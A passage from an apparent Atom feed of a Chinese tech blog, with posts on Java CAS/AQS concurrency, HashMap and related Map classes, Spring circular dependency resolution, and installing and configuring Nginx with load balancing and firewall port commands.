优点</strong>：资源竞争不大的场景系统开销小。</p><p><strong>CAS 缺点</strong>：</p><p>如果 CAS 长时间操作失败，即长时间自旋，会导致 CPU 开销大，但是可以使用 CPU 提供的 pause 指令，这个 pause 指令可以让自旋重试失败时 CPU 先睡眠一小段时间后再继续自旋重试 CAS 操作，jvm 支持 pause 指令，可以让性能提升一些。</p><p>存在 ABA 问题，即原来内存地址的值是 A，然后被改为了 B，再被改为 A 值，此时 CAS 操作时认为该值未被改动过，ABA 问题可以引入版本号来解决，每次改动都让版本号 +1。Java 中处理 ABA 的一个方案是 AtomicStampedReference 类，它是使用一个 int 类型的字段作为版本号，每次修改之前都先获取版本号和当前线程持有的版本号比对，如果一致才进行修改操作，并把版本号 +1。</p><p>无法保证代码块的原子性，CAS 只能保证单个变量的原子性操作，如果要保证多个变量的原子性操作就要使用悲观锁了。</p><h2 id="AQS（AbstractQueuedSynchronizer）原理分析"><a href="#AQS（AbstractQueuedSynchronizer）原理分析" class="headerlink" title="AQS（AbstractQueuedSynchronizer）原理分析"></a>AQS（AbstractQueuedSynchronizer）原理分析</h2><p>字面意思是<strong>抽象的队列同步器</strong>，AQS 是一个同步器框架，它制定了一套多线程场景下访问共享资源的方案，Java 中很多同步类底层都是使用 AQS 实现，比如：ReentrantLock、CountDownLatch、ReentrantReadWriteLock，这些 java 同步类的内部会使用一个 Sync 内部类，而这个 Sync 继承了 AbstractQueuedSynchronizer 类，这是一种模板方法模式，所以说这些同步类的底层是使用 AQS 实现。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/cas/1.png" alt="img"></p><p>AQS 内部维护了一个 volatile 修饰的 int state 属性（共享资源）和一个先进先出的线程等待队列（即多线程竞争共享资源时被阻塞的线程会进入这个队列）。因为 state 是使用 volatile 修饰，所以在多线程之前可见，访问 state 的方式有 3 种，getState()、setState()和 compareAndSetState()。</p><p><strong>AQS 定义了 3 种资源共享方式：</strong></p><p>独占锁（exclusive），保证只有一条线程执行，比如 ReentrantLock、AtomicInteger。</p><p>共享锁（shared），允许多个线程同时执行，比如 CountDownLatch、Semaphore。</p><p>同时实现独占和共享，比如 ReentrantReadWriteLock，允许多个线程同时执行读操作，只允许一条线程执行写操作。</p><p>ReentrantLock 和 CountDownLatch 都是<strong>自定义同步器</strong>，它们的内部类 Sync 都是继承了 AbstractQueuedSynchronizer，独占锁和共享锁的区别在于各自重写的获取和释放共享资源的方式不一样，至于线程获取资源失败、唤醒出队、中断等操作 AQS 已经实现好了。</p><p><strong>ReentrantLock</strong></p><p>state 的初始值是 0，即没有被锁定，当 A 线程 tryAcquire() 时会独占锁住 state，并且把 state+1，然后 B 线程（即其他线程）tryAcquire() 时就会失败进入等待队列，直到 A 线程 tryRelease() 释放锁把 state-1，此时也有可能出现重入锁的情况，state-1 后的值不是 0 而是一个正整数，因为重入锁也会 state+1，只有当 state=0 时，才代表其他线程可以 tryAcquire() 获取锁。</p><p><strong>CountDownLatch</strong></p><p>8 人赛跑场景，即开启 8 个线程进行赛跑，state 的初始值设置为 8（必须与线程数一致），每个参赛者跑到终点（即线程执行完毕）则调用 countDown()，使用 CAS 操作把 state-1，直到 8 个参赛者都跑到终点了（即 state=0），此时调用 await() 判断 state 是否为 0，如果是 0 则不阻塞继续执行后面的代码。</p><p>tryAcquire()、tryRelease()、tryAcquireShared()、tryReleaseShared() 的详细流程分析</p><p><strong>tryAcquire() 详细流程如下：</strong></p><p>调用 tryAcquire() 尝试获取共享资源，如果成功则返回 true;</p><p>如果不成功，则调用 addWaiter() 把此线程构造一个 Node 节点（标记为独占模式），并使用 CAS 操作把节点追加到等待队列的尾部，然后该 Node 节点的线程进入自旋状态;</p><p>线程自旋时，判断自旋节点的前驱节点是不是头结点，并且已经释放共享资源（即 state=0），自旋节点是否成功获取共享资源（即 state=1），如果三个条件都成立则自旋节点设置为头节点，如果不成立则把自旋节点的线程挂起，等待前驱节点唤醒。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/cas/2.png" alt="img"></p><p><strong>tryRelease() 详细流程如下：</strong></p><p>调用 tryRelease() 释放共享资源，即 state=0，然后唤醒没有被中断的后驱节点的线程;</p><p>被唤醒的线程自旋，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），自旋节点是否成功获取共享资源（即 state=1），如果三个条件都成立则自旋节点设置为头节点，如果不成立则把自旋节点的线程挂起，等待被前驱节点唤醒。</p><p><strong>tryAcquireShared() 详细流程如下：</strong></p><p>调用 tryAcquireShared() 尝试获取共享资源，如果 state&gt;=0，则表示同步状态（state）有剩余还可以让其他线程获取共享资源，此时获取成功返回;</p><p>如果 state&lt;0，则表示获取共享资源失败，把此线程构造一个 Node 节点（标记为共享模式），并使用 CAS 操作把节点追加到等待队列的尾部，然后该 Node 节点的线程进入自旋状态;</p><p>线程自旋时，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），再调用 tryAcquireShared() 尝试获取共享资源，如果三个条件都成立，则表示自旋节点可执行，同时把自旋节点设置为头节点，并且唤醒所有后继节点的线程。</p><p>如果不成立，挂起自旋的线程，等待被前驱节点唤醒。</p><p><strong>tryReleaseShared() 详细流程如下：</strong></p><p>调用 tryReleaseShared() 释放共享资源，即 state-1，然后遍历整个队列，唤醒所有没有被中断的后驱节点的线程;</p><p>被唤醒的线程自旋，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），再调用 tryAcquireShared() 尝试获取共享资源，如果三个条件都成立，则表示自旋节点可执行，同时把自旋节点设置为头节点，并且唤醒所有后继节点的线程。</p><p>如果不成立，挂起自旋的线程，等待被前驱节点唤醒。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CAS（Compare-And-Swap）原理分析&quot;&gt;&lt;a href=&quot;#CAS（Compare-And-Swap）原理分析&quot; class=&quot;headerlink&quot; title=&quot;CAS（Compare And Swap）原理分析&quot;&gt;&lt;/a&gt;CAS（Compare
      
    
    </summary>
    
    
    
      <category term="Concurrency" scheme="https://kayleh.top/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>Head First Map</title>
    <link href="https://kayleh.top/head-first-hashmap/"/>
    <id>https://kayleh.top/head-first-hashmap/</id>
    <published>2021-04-17T09:31:12.000Z</published>
    <updated>2021-04-17T18:29:25.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入浅出Map"><a href="#深入浅出Map" class="headerlink" title="深入浅出Map"></a>深入浅出Map</h1><blockquote><p>Map是java里边是一个接口,常见的实现类有HashMap、LinkedHashMap、TreeMap和ConcurrentHashMap</p></blockquote><p>HashMap底层数据结构是<code>数组+链表/红黑树</code></p><p>LinkedHashMap底层数据结构是<code>数组+链表+双向链表</code></p><p>TreeMap底层数据结构是<code>红黑树</code></p><p>ConcurrentHashMap底层数据结构是<code>数组+链表/红黑树</code></p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><blockquote><p>简单总结HashMap：</p><ul><li><strong>无序，允许为null，非同步</strong></li><li><strong>底层由散列表(哈希表)实现</strong></li><li><strong>初始容量和装载因子对HashMap影响挺大的</strong>，设置小了不好，设置大了也不好</li></ul></blockquote><h4 id="new一个hashmap时会发生什么"><a href="#new一个hashmap时会发生什么" class="headerlink" title="new一个hashmap时会发生什么?"></a>new一个hashmap时会发生什么?</h4><p>HashMap有几个构造方法,但最主要的就是指定初始值以及负载因子的大小.如果不指定,默认hashmap的<strong>大小为16</strong>,<strong>负载因子的大小为0.75</strong>.</p><blockquote><p>HashMap的大小只能是2次幂,（因为只有大小为2次幂时，才能合理用位运算替代取模）</p><p>假如传一个10进去,实际大小是16.</p><p>假如传入一个7进去,hashmap最终大小是8,具体实现在tableSizeFor可以看到</p></blockquote><p>把元素放进hashmap的时候，需要算出这个元素所在的位置（hash），在hashmap里用的是位运算来代替取模，能够更加高效地算出该元素所在的位置。</p><p>而负载因子的大小决定着哈希表的扩容和哈希冲突。</p><p>比如默认hashmap的大小为16,负载因子的大小为0.75.这意味着数组最多只能放16×0.75=12个元素，一旦超过12个元素，则哈希表需要扩容。每次Put元素的时候都会检查hashmap的大小有没有超过这个阈值，如果超过则扩容。</p><p>鉴于（HashMap的大小只能是2次幂），所以扩容的时候默认扩容为原来的2倍。</p><blockquote><p>扩容是耗时的,也可以通过调高负载因子来减少扩容.</p><p>但是一般不推荐这样做,因为这样意味着哈希冲突的概率会增高,哈希冲突的概率增高同样会耗时(因为查找的速度变慢了)</p></blockquote><h4 id="Put元素"><a href="#Put元素" class="headerlink" title="Put元素"></a>Put元素</h4><p>怎么计算hash？</p><blockquote><p>put元素的时候，先算出正常的哈希值，然后与高16位做异或运算，产生最终的哈希值。好处是增加了随机性，减少了碰撞冲突的可能性。</p></blockquote><p>put和get的实现</p><h4 id="put"><a href="#put" class="headerlink" title="put"></a>put</h4><blockquote><p>首先对key做hash运算，计算出该key所在的index。</p><p>如果没碰撞，直接放到数组中，如果碰撞了，需要判断目前数据结构是链表还是红黑树，根据不同的情况来进行插入。</p><p>假如key相同的，则替换到原来的值。最后判断哈希表是否满了（当前哈希表大小×负载因子），如果满了，则扩容。</p></blockquote><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><blockquote><p>还是对key做hash运算，计算出该key所在的index，然后判断是否有哈希冲突。</p><p>假如没有冲突则直接返回。假设有冲突则判断目前数据结构是链表还是红黑树，分别从不同的数据结构中取出。 </p></blockquote><h4 id="在hashmap中，怎么判断一个元素是否相同？"><a href="#在hashmap中，怎么判断一个元素是否相同？" class="headerlink" title="在hashmap中，怎么判断一个元素是否相同？"></a>在hashmap中，怎么判断一个元素是否相同？</h4><p>首先比较hash值，随后会用==运算符和equals()来判断该元素是否相同。</p><p>说白了，就是：</p><p>如果只有hash值相同，那说明该元素hash冲突了，如果hash值和equal() || == 都相同，那说明该元素是同一个。</p><h4 id="什么情况下会转红黑树？"><a href="#什么情况下会转红黑树？" class="headerlink" title="什么情况下会转红黑树？"></a>什么情况下会转红黑树？</h4><blockquote><p>当数组大小&gt;64且链表的大小&gt;8的时候才会将链表转为红黑树。当红黑树大小为6时，会退化为链表。</p><p>这里转红黑树退化为链表的操作主要出于查询和插入时对性能的考量</p><p>链表的查询时间复杂度为O(N),插入时间复杂度为O(1),红黑树查询和插入时间复杂度为O(logN)</p></blockquote><h4 id="线程安全？"><a href="#线程安全？" class="headerlink" title="线程安全？"></a>线程安全？</h4><blockquote><p>HashMap是线程不安全的，在多线程环境下，HashMap有可能会有数据丢失和获取不了最新数据的问题，比如线程A put进去了，线程B get不出来。</p></blockquote><h2 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h2><blockquote><p>实际上继承了HashMap，在HashMap的基础上维护了一个双向链表。</p><p>有了这个双向链表，插入的顺序是有序的。</p><p>LinkedHashMap在遍历的时候，实际上是用的是双向链表来遍历的，所以LinkedHashMap的大小不会影响到遍历的性能</p></blockquote><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><blockquote><p>TreeMap的key不能为null（如果为null就不能排序），TreeMap有序是通过Comparator来进行比较的，如果</p><p>Comparator为null，那么就使用自然顺序</p></blockquote><h2 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h2><blockquote><p>ConcurrentHashMap是JUC包下的线程安全的Map实现类，他能支持高并发的访问和更新。</p><p>线程安全的Map实现类还有HashTable，还有可以使用Collections来包装出一个线程安全的Map。</p><p>但是HashTable还是Collections来包装出来的，都比较低效，因为都是直接在外层套synchronize。</p><p>所以一般有线程安全问题考量的，都使用ConcurrentHashMap。</p></blockquote><p>ConcurrentHashMap通过在部分加锁和利用CAS算法来实现同步，在get的时候没有加锁，Node都用了volatile给修饰。</p><p>在扩容时，会给每个线程分配对应的区间，并且为了防止putVal导致数据不一致，会给线程的所负责的区间加锁。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;深入浅出Map&quot;&gt;&lt;a href=&quot;#深入浅出Map&quot; class=&quot;headerlink&quot; title=&quot;深入浅出Map&quot;&gt;&lt;/a&gt;深入浅出Map&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Map是java里边是一个接口,常见的实现类有HashMap、Linked
      
    
    </summary>
    
    
    
      <category term="algorithm" scheme="https://kayleh.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Spring Cyclic Ependencies</title>
    <link href="https://kayleh.top/Spring-cyclic-ependencies/"/>
    <id>https://kayleh.top/Spring-cyclic-ependencies/</id>
    <published>2021-04-16T07:36:37.000Z</published>
    <updated>2021-04-16T16:00:21.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spring是怎么解决循环依赖的？"><a href="#Spring是怎么解决循环依赖的？" class="headerlink" title="Spring是怎么解决循环依赖的？"></a>Spring是怎么解决循环依赖的？</h2><p>首先站在Spring整个Framework体系而言的话，Spring的Bean是由一个BeanDefinition来的，就是在Spring当中，有一个叫建模的类BeanDefinition，Spring的Bean有一系列比较复杂的生命周期：</p><ul><li><p>首先，Spring容器启动。</p></li><li><p>spring进行扫描</p></li><li>反射后封装成beanDefinition对象，放入beanDefinitionMap</li><li>遍历map</li><li>验证（是否单例、是否延迟加载、是否抽象）</li><li>推断构造方法（ 把当前这个Spring Bean所代表的类当中的构造方法得到一个最佳的一个构造方法 ）</li><li>准备开始进行实例</li><li>去单例池中查，没有——》去二级缓存中找，没有提前暴露——》生成一个objectFactory对象暴露到二级缓存中——》属性注入，发现依赖Y——》此时Y开始它的生命周期直到属性注入，发现依赖X-&gt;X又走一遍生命周期，当走到去二级缓存中找的时候找到了-&gt;往Y中注入X的objectFactory对象-&gt;完成循环依赖。</li></ul><p>1、为什么要使用X的objectFacory对象而不是直接使用X对象？</p><blockquote><p>利于拓展，程序员可以通过beanPostProcess接口操作objectFactory对象生成自己想要的对象</p></blockquote><p>2、是不是只能支持单例(scope=singleton)而不支持原型(scope=prototype)？</p><blockquote><p>是。因为单例是spring在启动时进行bean加载放入单例池中，在依赖的bean开始生命周期后，可以直接从二级缓存中取到它所依赖的bean的objectFactory对象从而结束循环依赖。而原型只有在用到时才会走生命周期流程，但是原型不存在一个已经实例化好的bean，所以会无限的创建-&gt;依赖-&gt;创建-&gt;依赖-&gt;…。</p></blockquote><p>3、循环依赖是不是只支持非构造方法？</p><blockquote><p>是。类似死锁问题 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Spring是怎么解决循环依赖的？&quot;&gt;&lt;a href=&quot;#Spring是怎么解决循环依赖的？&quot; class=&quot;headerlink&quot; title=&quot;Spring是怎么解决循环依赖的？&quot;&gt;&lt;/a&gt;Spring是怎么解决循环依赖的？&lt;/h2&gt;&lt;p&gt;首先站在Spring
      
    
    </summary>
    
    
    
      <category term="frame" scheme="https://kayleh.top/tags/frame/"/>
    
  </entry>
  
  <entry>
    <title>Head First Nginx</title>
    <link href="https://kayleh.top/Head-First-nginx/"/>
    <id>https://kayleh.top/Head-First-nginx/</id>
    <published>2021-04-14T21:55:17.000Z</published>
    <updated>2021-04-15T15:12:41.680Z</updated>
    
    <content type="html"><![CDATA[<h2 id="公司产品出现瓶颈？"><a href="#公司产品出现瓶颈？" class="headerlink" title="公司产品出现瓶颈？"></a>公司产品出现瓶颈？</h2><p>我们公司项目刚刚上线的时候，并发量小，用户使用的少，所以在低并发的情况下，一个jar包启动应用就够了，然后内部tomcat返回内容给用户。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy98b25257-71be-48f3-8afe-e1226ebc4589.png" alt="img"><br>但是慢慢的，使用我们平台的用户越来越多了，并发量慢慢增大了，这时候一台服务器满足不了我们的需求了。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy1d77bc35-df30-46fb-8c41-61ff4468d0c9.png" alt="img"><br>于是我们横向扩展，又增加了服务器。这个时候几个项目启动在不同的服务器上，用户要访问，就需要增加一个代理服务器了，通过代理服务器来帮我们转发和处理请求。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy33ee7313-9356-46e6-a0b2-fc1ed8ef9a62.png" alt="img"><br>我们希望这个代理服务器可以帮助我们接收用户的请求，然后将用户的请求按照规则帮我们转发到不同的服务器节点之上。这个过程用户是无感知的，用户并不知道是哪个服务器返回的结果，我们还希望他可以按照服务器的性能提供不同的权重选择。保证最佳体验！所以我们使用了Nginx。</p><h2 id="什么是Nginx？"><a href="#什么是Nginx？" class="headerlink" title="什么是Nginx？"></a>什么是Nginx？</h2><p>Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。2011年6月1日，nginx 1.0.4发布。</p><p>其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。在全球活跃的网站中有12.18%的使用比率，大约为2220万个网站。</p><p>Nginx 是一个安装非常的简单、配置文件非常简洁（还能够支持perl语法）、Bug非常少的服务。Nginx 启动特别容易，并且几乎可以做到7*24不间断运行，即使运行数个月也不需要重新启动。你还能够不间断服务的情况下进行软件版本的升级。</p><p>Nginx代码完全用C语言从头写成。官方数据测试表明能够支持高达 50,000 个并发连接数的响应。</p><h2 id="Nginx作用？"><a href="#Nginx作用？" class="headerlink" title="Nginx作用？"></a>Nginx作用？</h2><blockquote><p>Http代理，反向代理：作为web服务器最常用的功能之一，尤其是反向代理。</p></blockquote><p>正向代理<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy46bdad36-d3e0-43b0-a223-43360b7e8fc7.png" alt="img"><br>反向代理<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy62a15097-6e2a-4dbe-bcf5-f0d7cab81089.png" alt="img"></p><blockquote><p> Nginx提供的负载均衡策略有2种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的。</p></blockquote><p>轮询<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy4d33dfac-1949-4b2d-abb8-fe0b6e65b8dc.png" alt="img"><br>加权轮询<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyb1e3e440-4159-4259-a174-528b56cb04b2.png" alt="img"><br>iphash对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。<br><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudy64acb9a3-cd1a-4c0e-a1fa-9b220046a95a.png" alt="img"></p><blockquote><p>动静分离，在我们的软件开发中，有些请求是需要后台处理的，有些请求是不需要经过后台处理的（如：css、html、jpg、js等等文件），这些不需要经过后台处理的文件称为静态文件。让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作。提高资源响应的速度。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyedb1bbd6-e530-4aba-8fde-68658a10e73f.png" alt="img"></p><p>目前，通过使用Nginx大大提高了我们网站的响应速度，优化了用户体验，让网站的健壮性更上一层楼！</p><h1 id="Nginx的安装"><a href="#Nginx的安装" class="headerlink" title="Nginx的安装"></a>Nginx的安装</h1><h2 id="windows下安装"><a href="#windows下安装" class="headerlink" title="windows下安装"></a>windows下安装</h2><p><strong>1、下载nginx</strong></p><p><a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">http://nginx.org/en/download.html</a> 下载稳定版本。<br>以nginx/Windows-1.16.1为例，直接下载 nginx-1.16.1.zip。<br>下载后解压，解压后如下：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyb5a1d538-352c-4aa6-88f7-23d18f0588ab.png" alt="img"></p><p><strong>2、启动nginx</strong></p><p>有很多种方法启动nginx</p><p>(1)直接双击nginx.exe，双击后一个黑色的弹窗一闪而过</p><p>(2)打开cmd命令窗口，切换到nginx解压目录下，输入命令 <code>nginx.exe</code> ，回车即可</p><p><strong>3、检查nginx是否启动成功</strong></p><p>直接在浏览器地址栏输入网址 <a href="http://localhost/" target="_blank" rel="noopener">http://localhost:80</a> 回车，出现以下页面说明启动成功！</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudya21688c8-159e-4caa-8e65-3dc056b6b78e.png" alt="img"></p><p><strong>4、配置监听</strong></p><p>nginx的配置文件是conf目录下的nginx.conf，默认配置的nginx监听的端口为80，如果80端口被占用可以修改为未被占用的端口即可。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyf23105c4-b0b2-4e22-a1bf-b8098f40c144.png" alt="img"></p><p>当我们修改了nginx的配置文件nginx.conf 时，不需要关闭nginx后重新启动nginx，只需要执行命令 <code>nginx -s reload</code> 即可让改动生效</p><p><strong>5、关闭nginx</strong></p><p>如果使用cmd命令窗口启动nginx， 关闭cmd窗口是不能结束nginx进程的，可使用两种方法关闭nginx</p><p>(1)输入nginx命令 <code>nginx -s stop</code>(快速停止nginx) 或 <code>nginx -s quit</code>(完整有序的停止nginx)</p><p>(2)使用taskkill <code>taskkill /f /t /im nginx.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">taskkill是用来终止进程的，</span><br><span class="line">&#x2F;f是强制终止 .</span><br><span class="line">&#x2F;t终止指定的进程和任何由此启动的子进程。</span><br><span class="line">&#x2F;im示指定的进程名称 .</span><br></pre></td></tr></table></figure><h2 id="linux下安装"><a href="#linux下安装" class="headerlink" title="linux下安装"></a>linux下安装</h2><p><strong>1、安装gcc</strong></p><p>安装 nginx 需要先将官网下载的源码进行编译，编译依赖 gcc 环境，如果没有 gcc 环境，则需要安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br></pre></td></tr></table></figure><p><strong>2、PCRE pcre-devel 安装</strong></p><p>PCRE(Perl Compatible Regular Expressions) 是一个Perl库，包括 perl 兼容的正则表达式库。nginx 的 http 模块使用 pcre 来解析正则表达式，所以需要在 linux 上安装 pcre 库，pcre-devel 是使用 pcre 开发的一个二次开发库。nginx也需要此库。命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y pcre pcre-devel</span><br></pre></td></tr></table></figure><p><strong>3、zlib 安装</strong></p><p>zlib 库提供了很多种压缩和解压缩的方式， nginx 使用 zlib 对 http 包的内容进行 gzip ，所以需要在 Centos 上安装 zlib 库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y zlib zlib-devel</span><br></pre></td></tr></table></figure><p><strong>4、OpenSSL 安装</strong><br>OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试或其它目的使用。<br>nginx 不仅支持 http 协议，还支持 https（即在ssl协议上传输http），所以需要在 Centos 安装 OpenSSL 库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure><p><strong>5、下载安装包</strong></p><p>手动下载.tar.gz安装包，地址：<a href="https://nginx.org/en/download.html" target="_blank" rel="noopener">https://nginx.org/en/download.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyf51b946d-fda4-4675-b913-2084e028a5c0.png" alt="img"></p><p>下载完毕上传到服务器上 /root</p><p><strong>6、解压</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf nginx-1.18.0.tar.gz</span><br><span class="line">cd nginx-1.18.0</span><br></pre></td></tr></table></figure><p><strong>7、配置</strong></p><p>使用默认配置，在nginx根目录下执行</p><p>​        1、./configure 是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。</p><p>　　2、make 是用来编译的，它从Makefile中读取指令，然后编译。</p><p>　　3、make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</p><p>　　注意：AUTOMAKE和AUTOCONF是非常有用的用来发布C程序的东西。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>查找安装路径： <code>whereis nginx</code></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyf80f8dc2-d5df-4bc2-933d-6ce11f388f6e.png" alt="img"> </p><h2 id="Nginx常用命令"><a href="#Nginx常用命令" class="headerlink" title="Nginx常用命令"></a>Nginx常用命令</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/local/nginx/sbin/</span><br><span class="line">./nginx  启动</span><br><span class="line">./nginx -s stop  停止</span><br><span class="line">./nginx -s quit  安全退出</span><br><span class="line">./nginx -s reload  重新加载配置文件</span><br><span class="line">ps <span class="built_in">aux</span>|grep nginx  查看nginx进程</span><br></pre></td></tr></table></figure><p>启动成功访问 服务器ip:80</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/kuangstudyd64b251b-817c-436b-b7a0-57da7bb48cd1.png" alt="img"></p><p>注意：如何连接不上，检查阿里云安全组是否开放端口，或者服务器防火墙是否开放端口！<br>相关命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 开启</span><br><span class="line">service firewalld <span class="built_in">start</span></span><br><span class="line"># 重启</span><br><span class="line">service firewalld restart</span><br><span class="line"># 关闭</span><br><span class="line">service firewalld stop</span><br><span class="line"># 查看防火墙规则</span><br><span class="line">firewall-<span class="built_in">cmd</span> --list-all</span><br><span class="line"># 查询端口是否开放</span><br><span class="line">firewall-<span class="built_in">cmd</span> --query-port=<span class="number">8080</span>/tcp</span><br><span class="line"># 开放<span class="number">80</span>端口</span><br><span class="line">firewall-<span class="built_in">cmd</span> --permanent --add-port=<span class="number">80</span>/tcp</span><br><span class="line"># 移除端口</span><br><span class="line">firewall-<span class="built_in">cmd</span> --permanent --remove-port=<span class="number">8080</span>/tcp</span><br><span class="line">#重启防火墙(修改配置后要重启防火墙)</span><br><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line"># 参数解释</span><br><span class="line"><span class="number">1</span>、firwall-<span class="built_in">cmd</span>：是Linux提供的操作firewall的一个工具；</span><br><span class="line"><span class="number">2</span>、--permanent：表示设置为持久；</span><br><span class="line"><span class="number">3</span>、--add-port：标识添加的端口；</span><br></pre></td></tr></table></figure><h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/nginx/nginx.png" alt="nginx"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upstream lb&#123;</span><br><span class="line">    server <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8080</span> weight=<span class="number">1</span>;</span><br><span class="line">    server <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8081</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_pass http://lb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;公司产品出现瓶颈？&quot;&gt;&lt;a href=&quot;#公司产品出现瓶颈？&quot; class=&quot;headerlink&quot; title=&quot;公司产品出现瓶颈？&quot;&gt;&lt;/a&gt;公司产品出现瓶颈？&lt;/h2&gt;&lt;p&gt;我们公司项目刚刚上线的时候，并发量小，用户使用的少，所以在低并发的情况下，一个jar
      
    
    </summary>
    
    
    
      <category term="middleware" scheme="https://kayleh.top/tags/middleware/"/>
    
  </entry>
  
  <entry>
    <title>Web Test Combat</title>
    <link href="https://kayleh.top/web-test-combat/"/>
    <id>https://kayleh.top/web-test-combat/</id>
    <published>2021-04-13T08:50:01.000Z</published>
